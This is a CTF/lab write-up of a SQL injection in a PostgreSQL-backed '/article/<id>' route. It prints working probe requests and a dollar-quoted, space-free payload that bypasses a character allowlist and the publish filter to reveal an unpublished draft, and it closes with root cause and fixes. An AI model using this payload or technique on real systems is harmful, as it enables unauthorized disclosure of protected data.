# Gazette Pwnbox Lab - PostgreSQL Dollar-Quote SQL Injection

Date: 2026-06-08
Target type: CTF/lab
Bug class: SQL injection, authorization filter bypass, unpublished content disclosure

## Observation

The article route accepts an identifier in the path:

```text
/article/<id>
```

Arithmetic expressions are evaluated by PostgreSQL instead of being treated as opaque IDs.

Confirmed examples:

```text
/article/2-id -> article 1
/article/4-id -> article 2
/article/6-id -> article 3
```

This implies the payload is placed into a SQL expression similar to:

```sql
WHERE published = true AND id = <payload>
```

Direct access to hidden article IDs remains blocked:

```text
/article/6 -> 404, no article under that index
```

## Hypothesis

The application validates the path segment with a restricted character allowlist, but PostgreSQL dollar-quoted strings can create token boundaries without spaces or quote characters.

If an allowed payload can introduce an `OR` expression after the original `published = true AND id = ...` condition, it may bypass the publish filter.

## Evidence

Column/type probes:

```text
/article/published -> 500, operator does not exist: integer = boolean
/article/title     -> 500, operator does not exist: integer = text
/article/flag      -> 500, column "flag" does not exist
```

The useful constraints were:

- Allowed: letters, digits, `$`, `-`
- Rejected: spaces, tabs, newlines, block comments, `+`, `/`, `%`, encoded separators

## Test

Use PostgreSQL dollar-quoted strings and `NOTNULL`:

```text
/article/%24a%240%24a%24OR-0-%24b%240%24b%24NOTNULL--
```

Decoded payload:

```text
$a$0$a$OR-0-$b$0$b$NOTNULL--
```

Likely SQL shape:

```sql
published = true AND id = $a$0$a$ OR -0 - $b$0$b$ NOTNULL--
```

Due SQL precedence, this behaves like:

```sql
(published = true AND id = '0') OR ((-0 - '0') IS NOT NULL)
```

## Result

The request returned HTTP 200 and rendered published articles plus the unpublished draft:

```text
DRAFT - incident retro: pricing engine cutover
```

The draft contained a migration token / lab flag. The exact flag is intentionally not copied into this lab note.

Control request:

```text
/article/6
```

returned `404`, confirming that direct draft access is blocked and the bypass is required.

## Conclusion

Confirmed SQL injection in `/article/<id>` allows an attacker to bypass the server-side publish filter and disclose unpublished articles.

The root cause is unsafe string interpolation of a path segment into a PostgreSQL expression, combined with validation that blocks common separators but still allows PostgreSQL dollar-quoted strings and keyword/operator syntax.

## Failed Assumptions

- Commenting out the trailing SQL with `/article/6--` does not reveal the draft because `published = true` appears before the injectable `id` expression.
- Normal `OR true--` style payloads are blocked because spaces and typical separator characters are rejected.
- A missing `flag` column means the secret is in article content, not a dedicated `articles.flag` field.

## Why The Working Test Worked

PostgreSQL dollar-quoted strings create string literals without single quotes. The chosen tags use only allowed characters, and adjacent SQL keywords/operators still parse because the dollar-quoted string boundary acts as a token separator.

`NOTNULL` provides an `IS NOT NULL`-style test without requiring spaces.

## Fix

- Parameterize the article ID query instead of interpolating the path segment.
- Parse the path segment as an integer before database access.
- Reject non-decimal IDs before the SQL layer.
- Keep the `published = true` check server-side and covered by regression tests.
- Return generic errors instead of leaking database operator/type errors.

## Future Checklist Item

For PostgreSQL SQLi behind restrictive filters, test whether dollar-quoted strings can create token boundaries and whether keyword variants like `NOTNULL` avoid space requirements.
